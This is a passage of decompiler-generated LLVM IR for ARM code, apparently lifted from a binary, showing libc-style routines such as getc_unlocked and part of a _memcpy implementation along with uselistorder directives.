  uselistorder i32 %v1_17f0c, { 1, 0, 2 }
  uselistorder i32 %v0_17f04, { 3, 0, 1, 2 }
  uselistorder i1 %v3_17ee8, { 1, 0 }
  uselistorder i32 %v2_17ee8, { 1, 0 }
  uselistorder i32 %v2_17ee4, { 2, 1, 3, 4, 6, 0, 7, 5, 8 }
  uselistorder i1 %v7_17ed0, { 1, 0 }
  uselistorder i32 %v1_17ed4, { 2, 1, 0 }
  uselistorder i1 %v2_17ec4, { 1, 0 }
  uselistorder i32 %v0_17ec0, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_17ea8, { 1, 0 }
  uselistorder i32 %v1_17e9c, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v2_17e54, { 1, 2, 0 }
  uselistorder i32 %v2_17e50, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_17e50, { 1, 0, 2 }
  uselistorder i1 %v2_17e3c, { 1, 0 }
  uselistorder i32 %v0_17e34, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_17e44, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_17e24, { 1, 0 }
  uselistorder i32 %v0_17e14, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i1 %v6_17e0c, { 1, 0 }
  uselistorder i1 %v5_17e0c, { 1, 0 }
  uselistorder i32 %v0_17e08, { 0, 2, 1, 3 }
  uselistorder i32 %v0_17dfc, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_17df8, { 0, 1, 3, 5, 2, 4 }
  uselistorder i32 %v4_17dac, { 1, 0 }
  uselistorder i32 %v3_17dac, { 1, 0 }
  uselistorder i32 %v0_17ce0, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v2_17c18, { 0, 1, 3, 2 }
  uselistorder i32 %v1_17c14, { 1, 0 }
  uselistorder i32* %stack_var_-87, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-86, { 1, 2, 0 }
  uselistorder i32* %stack_var_-51, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-50, { 1, 3, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 8, 2, 3, 9, 4, 5, 6, 7 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 6, 2, 3, 7, 4, 8 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 12, 9, 4, 10, 11, 5, 13 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 16, 17, 19, 20, 21, 22, 23, 24, 42, 25, 26, 30, 27, 28, 29, 31, 53, 32, 33, 34, 35, 37, 36, 38, 39, 40, 41, 52, 43, 44, 51, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 11, 6, 7, 8, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 2, 7, 8, 17, 19, 15, 18, 9, 10, 16, 11, 12, 13, 20, 14, 1, 21, 22, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 7, 4, 5, 6, 8, 11, 9, 10, 12 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 51, 18, 19, 20, 21, 22, 23, 24, 25, 50, 26, 27, 28, 29, 30, 49, 31, 32, 33, 34, 35, 36, 37, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 48, 17, 18, 19, 20, 21, 22, 23, 24, 25, 47, 26, 27, 28, 29, 46, 30, 31, 32, 33, 34, 35, 36, 45, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 51, 18, 19, 20, 21, 22, 23, 24, 25, 26, 50, 27, 28, 29, 30, 49, 31, 32, 33, 34, 35, 36, 37, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32 47, { 1, 2, 0 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6, 7 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5, 6 }
  uselistorder i32 17, { 7, 0, 9, 10, 1, 11, 12, 2, 13, 3, 14, 4, 15, 5, 16, 24, 8, 17, 18, 19, 6, 20, 21, 22, 23 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6, 7 }
  uselistorder i8 69, { 1, 0 }
  uselistorder i32 96, { 1, 2, 0, 3 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder label %dec_label_pc_18224, { 2, 0, 1 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %dec_label_pc_1818c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18104, { 2, 0, 1 }
  uselistorder label %dec_label_pc_180dc, { 1, 0 }
  uselistorder label %.thread42, { 1, 0 }
  uselistorder label %dec_label_pc_180b4, { 1, 0 }
  uselistorder label %dec_label_pc_18090, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18074, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18048, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18044, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17f68, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %dec_label_pc_17f58, { 1, 0 }
  uselistorder label %dec_label_pc_17f4c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb202, { 1, 0 }
  uselistorder label %bb200, { 1, 0 }
  uselistorder label %.preheader, { 3, 2, 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %dec_label_pc_17e74, { 2, 0, 1 }
  uselistorder label %bb194, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb187, { 1, 0 }
  uselistorder label %.thread105, { 1, 0 }
  uselistorder label %bb184, { 1, 0 }
  uselistorder label %bb182, { 1, 0 }
  uselistorder label %bb180, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_1826c = load i32, i32* @r4, align 4
  store i32 %v3_1826c, i32* %stack_var_-8, align 4
  %v0_18270 = load i32, i32* @r0, align 4
  %v1_18270 = add i32 %v0_18270, 16
  %v2_18270 = inttoptr i32 %v1_18270 to i32*
  %v3_18270 = load i32, i32* %v2_18270, align 4
  store i32 %v3_18270, i32* %r2.global-to-local, align 4
  %v1_18274 = add i32 %v0_18270, 24
  %v2_18274 = inttoptr i32 %v1_18274 to i32*
  %v3_18274 = load i32, i32* %v2_18274, align 4
  %v3_18278 = icmp ult i32 %v3_18270, %v3_18274
  store i32 %v0_18270, i32* @r4, align 4
  br i1 %v3_18278, label %bb, label %dec_label_pc_18290

bb:                                               ; preds = %entry
  %v2_18280 = inttoptr i32 %v3_18270 to i8*
  %v3_18280 = load i8, i8* %v2_18280, align 1
  %v4_18280 = zext i8 %v3_18280 to i32
  store i32 %v4_18280, i32* %r0.global-to-local, align 4
  %v6_18280 = add i32 %v3_18270, 1
  store i32 %v6_18280, i32* %r2.global-to-local, align 4
  store i32 %v6_18280, i32* %v2_18270, align 4
  br label %dec_label_pc_18390

dec_label_pc_18290:                               ; preds = %entry
  %v1_18290 = inttoptr i32 %v0_18270 to i8*
  %v2_18290 = load i8, i8* %v1_18290, align 1
  %v3_18290 = zext i8 %v2_18290 to i32
  %v1_18294 = and i32 %v3_18290, 131
  %tmp22 = icmp ugt i32 %v1_18294, 128
  br i1 %tmp22, label %dec_label_pc_182b0, label %dec_label_pc_182a0

dec_label_pc_182a0:                               ; preds = %dec_label_pc_18290
  store i32 128, i32* @r1, align 4
  %v0_182a4 = call i32 @__stdio_trans2r_o()
  store i32 %v0_182a4, i32* %r0.global-to-local, align 4
  %v2_182a8 = icmp eq i32 %v0_182a4, 0
  br i1 %v2_182a8, label %dec_label_pc_182a0.dec_label_pc_182b0_crit_edge, label %dec_label_pc_1838c

dec_label_pc_182a0.dec_label_pc_182b0_crit_edge:  ; preds = %dec_label_pc_182a0
  %v0_182b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_182b0

dec_label_pc_182b0:                               ; preds = %dec_label_pc_182a0.dec_label_pc_182b0_crit_edge, %dec_label_pc_18290
  %v2_182fc = phi i32 [ %v0_182b0.pre, %dec_label_pc_182a0.dec_label_pc_182b0_crit_edge ], [ %v0_18270, %dec_label_pc_18290 ]
  %v1_182b0 = inttoptr i32 %v2_182fc to i8*
  %v2_182b0 = load i8, i8* %v1_182b0, align 1
  %v3_182b0 = zext i8 %v2_182b0 to i32
  store i32 %v3_182b0, i32* %r2.global-to-local, align 4
  %v1_182b4 = add i32 %v2_182fc, 1
  %v2_182b4 = inttoptr i32 %v1_182b4 to i8*
  %v3_182b4 = load i8, i8* %v2_182b4, align 1
  %v4_182b4 = zext i8 %v3_182b4 to i32
  %v4_182b8 = mul nuw nsw i32 %v4_182b4, 256
  %v5_182b8 = or i32 %v4_182b8, %v3_182b0
  store i32 %v5_182b8, i32* %r2.global-to-local, align 4
  %v1_182bc = and i32 %v3_182b0, 2
  %v2_182bc = icmp eq i32 %v1_182bc, 0
  br i1 %v2_182bc, label %dec_label_pc_182ec, label %dec_label_pc_182c4

dec_label_pc_182c4:                               ; preds = %dec_label_pc_182b0
  %tmp23 = urem i8 %v2_182b0, 2
  %v1_182c4 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_182c4
  %v4_182c8 = and i32 %tmp18, 4
  %v5_182c8 = add i32 %v4_182c8, %v2_182fc
  %v1_182cc = add i32 %v5_182c8, 36
  %v2_182cc = inttoptr i32 %v1_182cc to i8*
  %v3_182cc = load i8, i8* %v2_182cc, align 1
  %v4_182cc = zext i8 %v3_182cc to i32
  %v1_182d0 = add nsw i32 %v5_182b8, -1
  store i32 %v1_182d0, i32* %r2.global-to-local, align 4
  %v3_182d4 = sdiv i32 %v1_182d0, 256
  store i32 %v3_182d4, i32* %r1.global-to-local, align 4
  store i32 %v4_182cc, i32* %r0.global-to-local, align 4
  %v2_182e0 = add i32 %v2_182fc, 40
  %v3_182e0 = inttoptr i32 %v2_182e0 to i32*
  store i32 0, i32* %v3_182e0, align 4
  %v0_182e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_182e4 = trunc i32 %v0_182e4 to i8
  %v2_182e4 = load i32, i32* @r4, align 4
  %v3_182e4 = add i32 %v2_182e4, 1
  %v4_182e4 = inttoptr i32 %v3_182e4 to i8*
  store i8 %v1_182e4, i8* %v4_182e4, align 1
  br label %dec_label_pc_18320

dec_label_pc_182ec:                               ; preds = %dec_label_pc_182b0
  %v1_182ec = add i32 %v2_182fc, 16
  store i32 %v1_182ec, i32* %r1.global-to-local, align 4
  %v1_182f0 = inttoptr i32 %v1_182ec to i32*
  %v2_182f0 = load i32, i32* %v1_182f0, align 4
  store i32 %v2_182f0, i32* %r1.global-to-local, align 4
  %v3_182f0 = add i32 %v2_182fc, 20
  %v4_182f0 = inttoptr i32 %v3_182f0 to i32*
  %v5_182f0 = load i32, i32* %v4_182f0, align 4
  %v9_182f4 = icmp eq i32 %v5_182f0, %v2_182f0
  br i1 %v9_182f4, label %dec_label_pc_18304, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_182ec
  %v2_182f8 = inttoptr i32 %v2_182f0 to i8*
  %v3_182f8 = load i8, i8* %v2_182f8, align 1
  %v4_182f8 = zext i8 %v3_182f8 to i32
  store i32 %v4_182f8, i32* %r0.global-to-local, align 4
  %v6_182f8 = add i32 %v2_182f0, 1
  store i32 %v6_182f8, i32* %r1.global-to-local, align 4
  store i32 %v6_182f8, i32* %v1_182f0, align 4
  br label %dec_label_pc_18390

dec_label_pc_18304:                               ; preds = %dec_label_pc_182ec
  %v1_18304 = add i32 %v2_182fc, 4
  %v2_18304 = inttoptr i32 %v1_18304 to i32*
  %v3_18304 = load i32, i32* %v2_18304, align 4
  %v4_1830c = icmp eq i32 %v3_18304, -2
  br i1 %v4_1830c, label %dec_label_pc_18310, label %dec_label_pc_18328

dec_label_pc_18310:                               ; preds = %dec_label_pc_18304
  %v1_18310 = or i32 %v5_182b8, 4
  store i32 %v1_18310, i32* %r2.global-to-local, align 4
  store i8 %v3_182b4, i8* %v2_182b4, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18320

dec_label_pc_18320:                               ; preds = %dec_label_pc_182c4, %dec_label_pc_18310
  %v0_18320 = load i32, i32* %r2.global-to-local, align 4
  %v1_18320 = trunc i32 %v0_18320 to i8
  %v2_18320 = load i32, i32* @r4, align 4
  %v3_18320 = inttoptr i32 %v2_18320 to i8*
  store i8 %v1_18320, i8* %v3_18320, align 1
  br label %dec_label_pc_18390

dec_label_pc_18328:                               ; preds = %dec_label_pc_18304
  %v1_18328 = and i32 %v4_182b8, 768
  %v2_18328 = icmp eq i32 %v1_18328, 0
  br i1 %v2_18328, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_18328
  store i32 ptrtoint (i32** @global_var_26508.873 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_18328, %bb19
  store i32 99124, i32* @lr, align 4
  %v1_18330 = xor i1 %v2_18328, true
  call void @__pseudo_cond_branch(i1 %v1_18330, i32 ptrtoint (i32* @global_var_14af8.1120 to i32))
  %v0_18334 = load i32, i32* @r4, align 4
  %v1_18334 = add i32 %v0_18334, 8
  store i32 %v1_18334, i32* %r2.global-to-local, align 4
  %v1_18338 = inttoptr i32 %v1_18334 to i32*
  %v2_18338 = load i32, i32* %v1_18338, align 4
  store i32 %v2_18338, i32* %r2.global-to-local, align 4
  %v3_18338 = add i32 %v0_18334, 12
  %v4_18338 = inttoptr i32 %v3_18338 to i32*
  %v5_18338 = load i32, i32* %v4_18338, align 4
  %v9_1833c = icmp eq i32 %v5_18338, %v2_18338
  br i1 %v9_1833c, label %dec_label_pc_18370, label %dec_label_pc_18344

dec_label_pc_18344:                               ; preds = %bb20
  %v2_18344 = add i32 %v0_18334, 24
  %v3_18344 = inttoptr i32 %v2_18344 to i32*
  store i32 %v2_18338, i32* %v3_18344, align 4
  %v0_18348 = load i32, i32* @r4, align 4
  store i32 %v0_18348, i32* %r0.global-to-local, align 4
  %v2_1834c = call i32 @__stdio_rfill(i32 %v0_18348)
  store i32 %v2_1834c, i32* %r0.global-to-local, align 4
  %v2_18350 = icmp eq i32 %v2_1834c, 0
  br i1 %v2_18350, label %dec_label_pc_1838c, label %dec_label_pc_18358

dec_label_pc_18358:                               ; preds = %dec_label_pc_18344
  %v0_18358 = load i32, i32* @r4, align 4
  %v1_18358 = add i32 %v0_18358, 20
  %v2_18358 = inttoptr i32 %v1_18358 to i32*
  %v3_18358 = load i32, i32* %v2_18358, align 4
  %v2_1835c = add i32 %v0_18358, 24
  %v3_1835c = inttoptr i32 %v2_1835c to i32*
  store i32 %v3_18358, i32* %v3_1835c, align 4
  %v0_18360 = load i32, i32* @r4, align 4
  %v1_18360 = add i32 %v0_18360, 16
  %v2_18360 = inttoptr i32 %v1_18360 to i32*
  %v3_18360 = load i32, i32* %v2_18360, align 4
  %v1_18364 = inttoptr i32 %v3_18360 to i8*
  %v2_18364 = load i8, i8* %v1_18364, align 1
  %v3_18364 = zext i8 %v2_18364 to i32
  store i32 %v3_18364, i32* %r0.global-to-local, align 4
  %v5_18364 = add i32 %v3_18360, 1
  store i32 %v5_18364, i32* %v2_18360, align 4
  br label %dec_label_pc_18390

dec_label_pc_18370:                               ; preds = %bb20
  %v1_18370 = inttoptr i32 %v0_18334 to i8*
  store i32 %v0_18334, i32* %r0.global-to-local, align 4
  %v2_18374 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_18374, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1837c = call i32 @__stdio_READ(i8* %v1_18370, i32 %v2_18374, i32 1)
  store i32 %v5_1837c, i32* %r0.global-to-local, align 4
  %v2_18380 = icmp eq i32 %v5_1837c, 0
  br i1 %v2_18380, label %dec_label_pc_1838c, label %bb21

bb21:                                             ; preds = %dec_label_pc_18370
  %v4_18384 = load i8, i8* %stack_var_-9, align 1
  %v5_18384 = sext i8 %v4_18384 to i32
  store i32 %v5_18384, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18390

dec_label_pc_1838c:                               ; preds = %dec_label_pc_18370, %dec_label_pc_182a0, %dec_label_pc_18344
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18390

dec_label_pc_18390:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_18358, %dec_label_pc_18320, %dec_label_pc_1838c
  %v2_18394 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18394, i32* @r4, align 4
  %v8_18394 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_18394

; uselistorder directives
  uselistorder i32 %v2_182f0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_182b0, { 1, 0, 2 }
  uselistorder i32 %v2_182fc, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_18270, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i8** @global_var_26540.840, { 2, 1, 0 }
  uselistorder i32** @global_var_26508.873, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18390, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_1838c, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_18320, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_183a0 = load i32, i32* @r1, align 4
  %v1_183a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_183a0 = sub i32 %v0_183a0, %v1_183a0
  %v3_183a0 = icmp ult i32 %v0_183a0, %v1_183a0
  %v4_183a0 = xor i32 %v1_183a0, %v0_183a0
  %v5_183a0 = xor i32 %v2_183a0, %v0_183a0
  %v6_183a0 = and i32 %v5_183a0, %v4_183a0
  %v7_183a0 = icmp slt i32 %v6_183a0, 0
  store i1 %v7_183a0, i1* %cpsr_v.global-to-local, align 1
  %v8_183a0 = icmp slt i32 %v2_183a0, 0
  store i1 %v8_183a0, i1* %cpsr_n.global-to-local, align 1
  %v9_183a0 = icmp eq i32 %v0_183a0, %v1_183a0
  store i1 %v9_183a0, i1* @cpsr_z, align 1
  br i1 %v3_183a0, label %dec_label_pc_185ec, label %dec_label_pc_183a8

dec_label_pc_183a8:                               ; preds = %entry
  br i1 %v9_183a0, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_183a8
  %merge = phi i32 [ %v0_183a0, %dec_label_pc_183a8 ], [ %v2_18680, %bb143 ], [ %v11_1869c, %bb146 ], [ %v7_1869c, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_183a8
  %v5_183ac = inttoptr i32 %v1_183a0 to i8*
  store i8* %v5_183ac, i8** %stack_var_-8, align 4
  %v0_183b0 = load i32, i32* @r2, align 4
  %v2_183b0 = add i32 %v0_183b0, -4
  store i32 %v2_183b0, i32* %r2.global-to-local, align 4
  %v4_183b0 = sub i32 3, %v0_183b0
  %v5_183b0 = and i32 %v4_183b0, %v0_183b0
  %v6_183b0 = icmp slt i32 %v5_183b0, 0
  store i1 %v6_183b0, i1* %cpsr_v.global-to-local, align 1
  %v7_183b0 = icmp slt i32 %v2_183b0, 0
  store i1 %v7_183b0, i1* %cpsr_n.global-to-local, align 1
  %v5_183b4 = icmp slt i32 %v0_183b0, 4
  br i1 %v5_183b4, label %bb133, label %dec_label_pc_183b8

dec_label_pc_183b8:                               ; preds = %bb
  %v1_183b8 = urem i32 %v1_183a0, 4
  store i32 %v1_183b8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_183b8 = icmp eq i32 %v1_183b8, 0
  br i1 %v2_183b8, label %dec_label_pc_183c0, label %dec_label_pc_18464

dec_label_pc_183c0:                               ; preds = %dec_label_pc_183b8
  %v1_183c0 = urem i32 %v0_183a0, 4
  store i32 %v1_183c0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_183c0 = icmp eq i32 %v1_183c0, 0
  %extract.t = trunc i32 %v0_183a0 to i2
  br i1 %v2_183c0, label %dec_label_pc_183c8, label %dec_label_pc_18494

dec_label_pc_183c8:                               ; preds = %dec_label_pc_183c0, %dec_label_pc_1848c
  %v0_183e093 = phi i32 [ %v1_183a0, %dec_label_pc_183c0 ], [ %v0_184dc76, %dec_label_pc_1848c ]
  %v0_183dc92 = phi i32 [ %v0_183a0, %dec_label_pc_183c0 ], [ %v0_1848c, %dec_label_pc_1848c ]
  %v0_183c8 = phi i32 [ %v2_183b0, %dec_label_pc_183c0 ], [ %v2_18484, %dec_label_pc_1848c ]
  %v2_183c8 = add i32 %v0_183c8, -8
  store i32 %v2_183c8, i32* %r2.global-to-local, align 4
  %v4_183c8 = sub i32 7, %v0_183c8
  %v5_183c8 = and i32 %v4_183c8, %v0_183c8
  %v6_183c8 = icmp slt i32 %v5_183c8, 0
  store i1 %v6_183c8, i1* %cpsr_v.global-to-local, align 1
  %v7_183c8 = icmp slt i32 %v2_183c8, 0
  store i1 %v7_183c8, i1* %cpsr_n.global-to-local, align 1
  %v5_183cc = icmp slt i32 %v0_183c8, 8
  br i1 %v5_183cc, label %dec_label_pc_1841c, label %dec_label_pc_183d0

dec_label_pc_183d0:                               ; preds = %dec_label_pc_183c8
  %v2_183d0 = add i32 %v0_183c8, -28
  store i32 %v2_183d0, i32* %r2.global-to-local, align 4
  %v4_183d0 = sub i32 27, %v0_183c8
  %v5_183d0 = and i32 %v4_183d0, %v2_183c8
  %v6_183d0 = icmp slt i32 %v5_183d0, 0
  store i1 %v6_183d0, i1* %cpsr_v.global-to-local, align 1
  %v7_183d0 = icmp slt i32 %v2_183d0, 0
  store i1 %v7_183d0, i1* %cpsr_n.global-to-local, align 1
  %v5_183d4 = icmp slt i32 %v2_183c8, 20
  br i1 %v5_183d4, label %dec_label_pc_18408, label %dec_label_pc_183d8

dec_label_pc_183d8:                               ; preds = %dec_label_pc_183d0
  %v0_183d8 = load i32, i32* @r4, align 4
  store i32 %v0_183d8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_183dc

dec_label_pc_183dc:                               ; preds = %dec_label_pc_183dc.dec_label_pc_183dc_crit_edge, %dec_label_pc_183d8
  %v0_183e0 = phi i32 [ %v12_183e8, %dec_label_pc_183dc.dec_label_pc_183dc_crit_edge ], [ %v0_183e093, %dec_label_pc_183d8 ]
  %v0_183dc = phi i32 [ %v0_183dc.pre, %dec_label_pc_183dc.dec_label_pc_183dc_crit_edge ], [ %v0_183dc92, %dec_label_pc_183d8 ]
  %v1_183dc = inttoptr i32 %v0_183dc to i32*
  %v2_183dc = load i32, i32* %v1_183dc, align 4
  store i32 %v2_183dc, i32* %r3.global-to-local, align 4
  %v3_183dc = add i32 %v0_183dc, 4
  %v4_183dc = inttoptr i32 %v3_183dc to i32*
  %v5_183dc = load i32, i32* %v4_183dc, align 4
  store i32 %v5_183dc, i32* %r4.global-to-local, align 4
  %v6_183dc = add i32 %v0_183dc, 8
  %v7_183dc = inttoptr i32 %v6_183dc to i32*
  %v8_183dc = load i32, i32* %v7_183dc, align 4
  store i32 %v8_183dc, i32* %ip.global-to-local, align 4
  %v9_183dc = add i32 %v0_183dc, 12
  %v10_183dc = inttoptr i32 %v9_183dc to i32*
  %v11_183dc = load i32, i32* %v10_183dc, align 4
  store i32 %v11_183dc, i32* %lr.global-to-local, align 4
  %v12_183dc = add i32 %v0_183dc, 16
  store i32 %v12_183dc, i32* %r1.global-to-local, align 4
  %v1_183e0 = inttoptr i32 %v0_183e0 to i32*
  store i32 %v2_183dc, i32* %v1_183e0, align 4
  %v3_183e0 = add i32 %v0_183e0, 4
  %v4_183e0 = inttoptr i32 %v3_183e0 to i32*
  %v5_183e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_183e0, i32* %v4_183e0, align 4
  %v6_183e0 = add i32 %v0_183e0, 8
  %v7_183e0 = inttoptr i32 %v6_183e0 to i32*
  %v8_183e0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_183e0, i32* %v7_183e0, align 4
  %v9_183e0 = add i32 %v0_183e0, 12
  %v10_183e0 = inttoptr i32 %v9_183e0 to i32*
  %v11_183e0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_183e0, i32* %v10_183e0, align 4
  %v12_183e0 = add i32 %v0_183e0, 16
  store i32 %v12_183e0, i32* %r0.global-to-local, align 4
  %v0_183e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_183e4 = inttoptr i32 %v0_183e4 to i32*
  %v2_183e4 = load i32, i32* %v1_183e4, align 4
  store i32 %v2_183e4, i32* %r3.global-to-local, align 4
  %v3_183e4 = add i32 %v0_183e4, 4
  %v4_183e4 = inttoptr i32 %v3_183e4 to i32*
  %v5_183e4 = load i32, i32* %v4_183e4, align 4
  store i32 %v5_183e4, i32* %r4.global-to-local, align 4
  %v6_183e4 = add i32 %v0_183e4, 8
  %v7_183e4 = inttoptr i32 %v6_183e4 to i32*
  %v8_183e4 = load i32, i32* %v7_183e4, align 4
  store i32 %v8_183e4, i32* @ip, align 4
  %v9_183e4 = add i32 %v0_183e4, 12
  %v10_183e4 = inttoptr i32 %v9_183e4 to i32*
  %v11_183e4 = load i32, i32* %v10_183e4, align 4
  store i32 %v11_183e4, i32* @lr, align 4
  %v12_183e4 = add i32 %v0_183e4, 16
  store i32 %v12_183e4, i32* @r1, align 4
  %v1_183e8 = inttoptr i32 %v12_183e0 to i32*
  store i32 %v2_183e4, i32* %v1_183e8, align 4
  %v3_183e8 = add i32 %v0_183e0, 20
  %v4_183e8 = inttoptr i32 %v3_183e8 to i32*
  %v5_183e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_183e8, i32* %v4_183e8, align 4
  %v6_183e8 = add i32 %v0_183e0, 24
  %v7_183e8 = inttoptr i32 %v6_183e8 to i32*
  %v8_183e8 = load i32, i32* @ip, align 4
  store i32 %v8_183e8, i32* %v7_183e8, align 4
  %v9_183e8 = add i32 %v0_183e0, 28
  %v10_183e8 = inttoptr i32 %v9_183e8 to i32*
  %v11_183e8 = load i32, i32* @lr, align 4
  store i32 %v11_183e8, i32* %v10_183e8, align 4
  %v12_183e8 = add i32 %v0_183e0, 32
  store i32 %v12_183e8, i32* %r0.global-to-local, align 4
  %v0_183ec = load i32, i32* %r2.global-to-local, align 4
  %v2_183ec = add i32 %v0_183ec, -32
  store i32 %v2_183ec, i32* %r2.global-to-local, align 4
  %v6_183f0 = icmp slt i32 %v0_183ec, 32
  br i1 %v6_183f0, label %dec_label_pc_183f4, label %dec_label_pc_183dc.dec_label_pc_183dc_crit_edge

dec_label_pc_183dc.dec_label_pc_183dc_crit_edge:  ; preds = %dec_label_pc_183dc
  %v0_183dc.pre = load i32, i32* @r1, align 4
